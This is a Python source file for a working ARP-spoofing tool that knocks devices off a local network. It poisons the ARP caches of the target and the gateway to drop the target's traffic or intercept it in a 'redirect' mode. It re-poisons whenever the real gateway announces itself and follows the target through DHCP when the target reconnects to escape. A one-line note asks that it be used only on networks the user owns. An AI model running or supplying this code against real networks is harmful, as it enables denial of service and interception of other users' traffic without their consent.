"""
ARP-spoofing based kick service.

Works by poisoning the target's ARP cache (telling it our MAC is the gateway),
and the gateway's ARP cache (telling it our MAC is the target). Traffic is
dropped (kick) or forwarded (redirect).

Three background threads per kick:
  1. _poison_loop    — floods forged ARP replies at 20/sec
  2. _counter_loop   — re-poisons immediately when gateway broadcasts real MAC
  3. _track_ip_loop  — follows target if iOS reconnects and gets a new IP
  4. _liveness_loop  — pings target to report whether kick is effective

Hotspot fallback (macOS only):
  When your Mac IS the gateway (hotspot/Internet Sharing), ARP spoofing is
  impossible. start_kick() automatically falls back to pf firewall rules to
  block the target instead. stop_kick() cleans up the pf rule.

NOTE: Requires root / CAP_NET_RAW. Only use on networks you own/administer.
"""

from __future__ import annotations

import ipaddress
import logging
import os
import platform
import re
import subprocess
import threading
import time
from dataclasses import dataclass, field
from typing import Optional

from scapy.all import ARP, BOOTP, DHCP, Ether, IP, conf, get_if_hwaddr, sendp, sniff, srp

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SPOOF_INTERVAL    = 0.05  # seconds between poison bursts (20/sec beats most routers)
LIVENESS_INTERVAL = 5.0   # seconds between ping probes
RESTORE_COUNT     = 8     # corrective packets on stop

_BROADCAST = "ff:ff:ff:ff:ff:ff"
_MAC_RE = re.compile(r"^([0-9a-f]{2}:){5}[0-9a-f]{2}$")

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
_kicks: dict[str, "_Kick"] = {}
_pf_kicks: dict[str, str] = {}   # ip → pf anchor name (hotspot fallback)
_lock  = threading.Lock()


@dataclass
class _Kick:
    target_ip:  str
    target_mac: str
    gw_ip:      str
    gw_mac:     str
    iface:      str
    local_mac:  str
    mode:       str
    stop:       threading.Event        = field(default_factory=threading.Event)
    effective:  bool                   = False
    started_at: float                  = field(default_factory=time.time)
    _threads:   list[threading.Thread] = field(default_factory=list)

    def start_threads(self) -> None:
        for fn in (_poison_loop, _counter_loop, _track_ip_loop, _liveness_loop):
            t = threading.Thread(target=fn, args=(self,), daemon=True)
            self._threads.append(t)
            t.start()

    def join(self, timeout: float = 2.0) -> None:
        self.stop.set()
        for t in self._threads:
            t.join(timeout=timeout)


# ---------------------------------------------------------------------------
# Packet helpers
# ---------------------------------------------------------------------------
def _arp_reply(src_mac: str, dst_mac: str, src_ip: str, dst_ip: str) -> Ether:
    return Ether(src=src_mac, dst=dst_mac) / ARP(
        op=2,
        hwsrc=src_mac, psrc=src_ip,
        hwdst=dst_mac, pdst=dst_ip,
    )


def _spoof_pkts(k: _Kick) -> list:
    return [
        _arp_reply(k.local_mac, k.target_mac, k.gw_ip,     k.target_ip),
        _arp_reply(k.local_mac, _BROADCAST,   k.gw_ip,     k.target_ip),
        _arp_reply(k.local_mac, k.gw_mac,     k.target_ip, k.gw_ip),
        _arp_reply(k.local_mac, _BROADCAST,   k.target_ip, k.gw_ip),
    ]


def _restore_pkts(k: _Kick) -> list:
    return [
        _arp_reply(k.gw_mac,     k.target_mac, k.gw_ip,     k.target_ip),
        _arp_reply(k.gw_mac,     _BROADCAST,   k.gw_ip,     k.target_ip),
        _arp_reply(k.target_mac, k.gw_mac,     k.target_ip, k.gw_ip),
        _arp_reply(k.target_mac, _BROADCAST,   k.target_ip, k.gw_ip),
    ]


# ---------------------------------------------------------------------------
# Background threads
# ---------------------------------------------------------------------------
def _poison_loop(k: _Kick) -> None:
    """Flood forged ARP replies until stopped."""
    logger.info("kick started: %s (%s) via %s", k.target_ip, k.target_mac, k.iface)
    _set_ip_forwarding(k.mode == "redirect")
    while not k.stop.is_set():
        try:
            sendp(_spoof_pkts(k), iface=k.iface, verbose=False)
        except Exception as e:
            logger.warning("poison send error: %s", e)
        k.stop.wait(SPOOF_INTERVAL)
    try:
        sendp(_restore_pkts(k), iface=k.iface, count=RESTORE_COUNT, inter=0.1, verbose=False)
        logger.info("ARP restored for %s", k.target_ip)
    except Exception as e:
        logger.warning("restore failed: %s", e)
    if k.mode == "redirect":
        _set_ip_forwarding(False)


def _counter_loop(k: _Kick) -> None:
    """Re-poison immediately whenever the real gateway broadcasts its true MAC."""
    while not k.stop.is_set():
        try:
            pkts = sniff(
                iface=k.iface,
                filter=f"arp host {k.gw_ip}",
                timeout=1,  # unblock every 1s to check stop event
                store=True,
            )
            for pkt in pkts:
                if k.stop.is_set():
                    return
                if (ARP in pkt and
                        pkt[ARP].psrc == k.gw_ip and
                        pkt[ARP].hwsrc != k.local_mac):
                    sendp(_spoof_pkts(k), iface=k.iface, verbose=False)
        except Exception as e:
            logger.warning("counter_loop error: %s", e)


def _track_ip_loop(k: _Kick) -> None:
    """
    Track target IP changes via DHCP.
    iOS reconnects and gets a new IP after detecting ARP poisoning —
    this follows the new IP and resumes spoofing immediately.
    """
    def handle(pkt):
        if k.stop.is_set():
            return
        try:
            # DHCP ACK (type=5) sent to target MAC → target got a new IP
            if (DHCP in pkt and
                    Ether in pkt and
                    pkt[Ether].dst == k.target_mac):
                # Find message-type option
                for opt in pkt[DHCP].options:
                    if isinstance(opt, tuple) and opt[0] == "message-type" and opt[1] == 5:
                        new_ip = pkt[BOOTP].yiaddr
                        if new_ip and new_ip != "0.0.0.0" and new_ip != k.target_ip:
                            logger.info(
                                "target IP changed %s -> %s, resuming kick",
                                k.target_ip, new_ip,
                            )
                            k.target_ip = new_ip
                            # Update kick registry key
                            with _lock:
                                old_key = None
                                for key, val in _kicks.items():
                                    if val is k:
                                        old_key = key
                                        break
                                if old_key and old_key != new_ip:
                                    _kicks.pop(old_key, None)
                                    _kicks[new_ip] = k
                        break
        except Exception:
            pass

    sniff(
        iface=k.iface,
        filter="udp port 67 or udp port 68",
        prn=handle,
        stop_filter=lambda _: k.stop.is_set(),
        store=False,
    )


def _liveness_loop(k: _Kick) -> None:
    """Ping target every few seconds; records whether the kick is effective."""
    while not k.stop.is_set():
        k.effective = not _ping(k.target_ip)
        k.stop.wait(LIVENESS_INTERVAL)


# ---------------------------------------------------------------------------
# Network utilities
# ---------------------------------------------------------------------------
def _ping(ip: str, timeout: float = 1.0) -> bool:
    sys = platform.system()
    try:
        if sys == "Linux":
            cmd = ["ping", "-c", "1", "-W", str(int(timeout * 1000)), ip]
        elif sys == "Darwin":
            cmd = ["ping", "-c", "1", "-t", str(int(timeout)), ip]
        else:
            cmd = ["ping", "-n", "1", "-w", str(int(timeout * 1000)), ip]
        return subprocess.run(cmd, capture_output=True, timeout=timeout + 1).returncode == 0
    except Exception:
        return False


def _resolve_mac(ip: str, iface: str, timeout: float = 2.0, retries: int = 3) -> Optional[str]:
    # 1. Check system ARP cache first — works even when raw ARP probes are blocked
    try:
        cmd = ["arp", "-n", ip] if platform.system() == "Linux" else ["arp", ip]
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=2).stdout
        m = re.search(r"([0-9a-fA-F]{1,2}(?::[0-9a-fA-F]{1,2}){5})", out)
        if m:
            mac = normalize_mac(m.group(1))
            if mac and mac != "ff:ff:ff:ff:ff:ff":
                logger.debug("ARP cache hit for %s: %s", ip, mac)
                return mac
    except Exception:
        pass

    # 2. Ping to populate ARP cache then retry
    try:
        _ping(ip, timeout=1.0)
        cmd = ["arp", "-n", ip] if platform.system() == "Linux" else ["arp", ip]
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=2).stdout
        m = re.search(r"([0-9a-fA-F]{1,2}(?::[0-9a-fA-F]{1,2}){5})", out)
        if m:
            mac = normalize_mac(m.group(1))
            if mac and mac != "ff:ff:ff:ff:ff:ff":
                logger.debug("ARP cache hit after ping for %s: %s", ip, mac)
                return mac
    except Exception:
        pass

    # 3. Fall back to scapy srp()
    for _ in range(retries):
        try:
            ans, _ = srp(Ether(dst=_BROADCAST) / ARP(pdst=ip),
                         iface=iface, timeout=timeout, verbose=False)
            if ans:
                return ans[0][1].hwsrc.lower()
        except Exception:
            pass
        time.sleep(0.3)

    return None


def _set_ip_forwarding(enable: bool) -> None:
    val = "1" if enable else "0"
    try:
        if platform.system() == "Linux":
            try:
                open("/proc/sys/net/ipv4/ip_forward", "w").write(val)
                return
            except PermissionError:
                subprocess.run(["sudo", "-n", "sysctl", "-w", f"net.ipv4.ip_forward={val}"],
                               capture_output=True, timeout=3)
        elif platform.system() == "Darwin":
            subprocess.run(["sudo", "-n", "sysctl", "-w", f"net.inet.ip.forwarding={val}"],
                           capture_output=True, timeout=3)
    except Exception as e:
        logger.warning("ip_forward toggle failed: %s", e)


def _get_gateway_for(ip: str, iface: str) -> Optional[str]:
    conf.route.resync()
    try:
        routed_iface, our_ip, gw_ip = conf.route.route(ip)

        # Direct subnet route — scapy returns 0.0.0.0, use default gateway instead
        if gw_ip == "0.0.0.0":
            _, our_ip, gw_ip = conf.route.route("0.0.0.0")

        # If still no gateway or gateway is our own IP, we ARE the gateway
        if not gw_ip or gw_ip == "0.0.0.0" or gw_ip == our_ip:
            return None

        # Sanity: gateway must be on the same interface
        if routed_iface != iface:
            return None

        return gw_ip
    except Exception:
        return None

# ---------------------------------------------------------------------------
# pf firewall fallback (macOS hotspot mode)
# ---------------------------------------------------------------------------
def _pf_anchor_name(ip: str) -> str:
    return f"com.kickservice.block.{ip.replace('.', '_')}"


def _pf_block(ip: str) -> bool:
    """
    Add a pf anchor that drops all traffic from `ip`.
    Returns True on success, False on failure.
    Requires sudo without password (NOPASSWD in sudoers) or running as root.
    """
    if platform.system() != "Darwin":
        logger.warning("pf fallback only supported on macOS")
        return False

    anchor = _pf_anchor_name(ip)
    rule = f"block drop from {ip} to any\n"

    try:
        # Write the rule into the anchor via stdin
        load = subprocess.run(
            ["sudo", "-n", "pfctl", "-a", anchor, "-f", "-"],
            input=rule, text=True, capture_output=True, timeout=5,
        )
        if load.returncode != 0:
            logger.error("pfctl load failed: %s", load.stderr.strip())
            return False

        # Make sure pf is enabled
        subprocess.run(
            ["sudo", "-n", "pfctl", "-e"],
            capture_output=True, timeout=5,
        )

        logger.info("pf block active for %s (anchor: %s)", ip, anchor)
        return True
    except Exception as e:
        logger.error("pf_block error for %s: %s", ip, e)
        return False


def _pf_unblock(ip: str) -> bool:
    """Remove the pf anchor for `ip`, restoring its connectivity."""
    if platform.system() != "Darwin":
        return False

    anchor = _pf_anchor_name(ip)
    try:
        # Flush the anchor rules (empty ruleset = no block)
        flush = subprocess.run(
            ["sudo", "-n", "pfctl", "-a", anchor, "-F", "rules"],
            capture_output=True, timeout=5,
        )
        if flush.returncode != 0:
            logger.warning("pfctl flush failed: %s", flush.stderr.strip())
            return False

        logger.info("pf block removed for %s", ip)
        return True
    except Exception as e:
        logger.error("pf_unblock error for %s: %s", ip, e)
        return False


# ---------------------------------------------------------------------------
# Input validation
# ---------------------------------------------------------------------------
def normalize_mac(mac: str) -> Optional[str]:
    if not isinstance(mac, str):
        return None
    mac = mac.strip().lower().replace("-", ":")
    if not _MAC_RE.match(mac):
        parts = mac.split(":")
        if len(parts) != 6:
            return None
        mac = ":".join(p.zfill(2) for p in parts)
        if not _MAC_RE.match(mac):
            return None
    return mac


def validate_ip(ip: str) -> Optional[str]:
    try:
        addr = ipaddress.IPv4Address(ip.strip())
    except Exception:
        return None
    if addr.is_loopback or addr.is_multicast or addr.is_unspecified or addr.is_link_local:
        return None
    if str(addr) == "255.255.255.255":
        return None
    return str(addr)


def _check_root() -> Optional[str]:
    if platform.system() in ("Linux", "Darwin"):
        if hasattr(os, "geteuid") and os.geteuid() != 0:
            return "Not running as root — ARP spoofing will likely fail. Use sudo."
    return None


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------
def start_kick(target_ip: str, target_mac: str, mode: str = "kick") -> dict:
    ip = validate_ip(target_ip)
    if not ip:
        raise ValueError(f"Invalid IP: {target_ip!r}")

    tmac = normalize_mac(target_mac)
    if not tmac:
        raise ValueError(f"Invalid MAC: {target_mac!r}")

    if mode not in ("kick", "redirect"):
        raise ValueError(f"Unknown mode: {mode!r}")

    warning = _check_root()

    iface, _our_ip, _ = conf.route.route(ip)
    if not iface or iface in ("lo", "lo0"):
        raise ValueError(f"No routable interface found for {ip}")

    try:
        local_mac = get_if_hwaddr(iface).lower()
    except Exception as e:
        raise ValueError(f"Cannot read MAC for {iface}: {e}")

    if local_mac == tmac:
        raise ValueError("Target MAC is our own MAC.")

    gw_ip = _get_gateway_for(ip, iface)
    if not gw_ip:
        # Hotspot mode — Mac is the gateway, ARP spoofing won't work.
        # Fall back to pf firewall block instead.
        logger.info("Hotspot detected on %s — using pf fallback for %s", iface, ip)
        success = _pf_block(ip)
        if not success:
            raise ValueError(
                f"Cannot kick {ip}: your Mac is the gateway on {iface} (hotspot mode) "
                f"and pf firewall block also failed. Make sure the backend runs as root."
            )
        with _lock:
            _pf_kicks[ip] = _pf_anchor_name(ip)
        return {
            "ip": ip,
            "mac": tmac,
            "mode": "pf_block",
            "iface": iface,
            "gateway": "self",
            "effective": True,
            "uptime_sec": 0,
            "message": f"Hotspot mode: {ip} blocked via pf firewall.",
        }

    gw_mac = _resolve_mac(gw_ip, iface)
    if not gw_mac:
        raise ValueError(f"Cannot ARP-resolve gateway {gw_ip} on {iface}.")

    with _lock:
        old = _kicks.get(ip)
        if old:
            if old.mode == mode and old._threads and old._threads[0].is_alive():
                return _status(old, warning, "already active")
            old.join()
            _kicks.pop(ip, None)

        k = _Kick(target_ip=ip, target_mac=tmac, gw_ip=gw_ip,
                  gw_mac=gw_mac, iface=iface, local_mac=local_mac, mode=mode)
        _kicks[ip] = k
        k.start_threads()

    return _status(k, warning, "started")


def stop_kick(target_ip: str) -> dict:
    ip = validate_ip(target_ip)
    if not ip:
        raise ValueError(f"Invalid IP: {target_ip!r}")

    # Check pf fallback first
    with _lock:
        pf_anchor = _pf_kicks.pop(ip, None)
    if pf_anchor:
        success = _pf_unblock(ip)
        return {"ip": ip, "stopped": success, "mode": "pf_block"}

    with _lock:
        k = _kicks.pop(ip, None)
    if not k:
        return {"ip": ip, "stopped": False}
    k.join()
    return {"ip": ip, "stopped": True}


def stop_all_kicks() -> int:
    with _lock:
        items = list(_kicks.values())
        _kicks.clear()
        pf_ips = list(_pf_kicks.keys())
        _pf_kicks.clear()
    for k in items:
        k.stop.set()
    for k in items:
        k.join(timeout=1.5)
    for ip in pf_ips:
        _pf_unblock(ip)
    return len(items) + len(pf_ips)


def get_active_kicks() -> list[dict]:
    with _lock:
        dead = [ip for ip, k in _kicks.items() if not k._threads or not k._threads[0].is_alive()]
        for ip in dead:
            _kicks.pop(ip)
        arp_list = [_status(k) for k in _kicks.values()]
        pf_list = [
            {
                "ip": ip,
                "mode": "pf_block",
                "iface": "hotspot",
                "gateway": "self",
                "effective": True,
                "uptime_sec": 0,
            }
            for ip in _pf_kicks
        ]
    return arp_list + pf_list


def _status(k: _Kick, warning: Optional[str] = None, message: Optional[str] = None) -> dict:
    out = {
        "ip":         k.target_ip,
        "mac":        k.target_mac,
        "mode":       k.mode,
        "iface":      k.iface,
        "gateway":    k.gw_ip,
        "effective":  k.effective,
        "uptime_sec": round(time.time() - k.started_at, 1),
    }
    if warning:
        out["warning"] = warning
    if message:
        out["message"] = message
    return out